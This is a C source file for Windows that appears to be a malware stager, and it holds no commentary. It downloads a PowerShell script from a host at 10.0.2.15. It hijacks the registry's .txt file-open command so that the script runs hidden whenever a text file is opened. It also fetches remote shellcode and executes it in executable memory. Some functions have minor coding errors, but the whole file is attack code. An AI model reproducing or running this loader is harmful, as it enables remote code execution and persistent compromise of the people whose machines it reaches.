#include <windows.h>
#include <stdio.h>
#include <wininet.h>

#pragma comment(lib, "wininet.lib")

#define SHELLCODE_URL "http://10.0.2.15/shellcode.bin"

BOOL DownloadPayload(const char* url, const char* file_path) {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

    if (hInternet == NULL) return FALSE;

    HINTERNET hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);

    if (hConnect == NULL)
    {
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    BYTE buffer[4096];
    DWORD bytesRead;

    HANDLE hFile = CreateFileA(file_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE)
    {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead) {
        DWORD bytesWritten;
        
        WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL);
    }

    CloseHandle(hFile);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return TRUE;
}

void staged() {
	HINTERNET hInternet, hConnect;
	DWORD bytesRead;
	BYTE shellcode[1024];

	hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

	if (hInternet == NULL) {
		return -1;
	}

	hConnect = InternetOpenUrlA(hInternet, SHELLCODE_URL, NULL, 0, INTERNET_FLAG_RELOAD, 0);

	if (hConnect == NULL) {

		InternetCloseHandle(hInternet);
	}

    if (!InternetReadFile(hConnect, shellcode, sizeof(shellcode), &bytesRead)) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    LPVOID execMem = VirtualAlloc(NULL, bytesRead, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMem) {
        return -1;
    }

    memcpy(execMem, shellcode, bytesRead);

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);

    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }
    else {
        return FALSE;
    }

    VirtualFree(execMem, 0, MEM_RELEASE);
}

void persistence(const wchar_t* newValue) {
    HKEY hKey;
    LONG result;

    result = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Classes\\txtfile\\shell\\open\\command",
        0,
        KEY_SET_VALUE,
        &hKey);

    if (result == ERROR_SUCCESS) {
        result = RegSetValueEx(hKey, NULL, 0, REG_EXPAND_SZ, (const BYTE*)newValue, (wcslen(newValue) + 1) * sizeof(wchar_t));
        if (result == ERROR_SUCCESS) {
            return TRUE;
        }
        else {
            return FALSE;
        }

        RegCloseKey(hKey);
    }
    else {
        return FALSE;
    }

    RegCloseKey(hKey);
}

int main() {

    const char* ps1_url = "http://10.0.2.15/persist.ps1";
    const char* file_path = "C:\\Windows\\Temp\\persist.ps1";
    const wchar_t* newValue = L"powershell -windowstyle hidden C:\\Windows\\Temp\\persist.ps1 %1";

    DownloadPayload(ps1_url, file_path);
    persistence(newValue);
    staged();
    return 0;
}
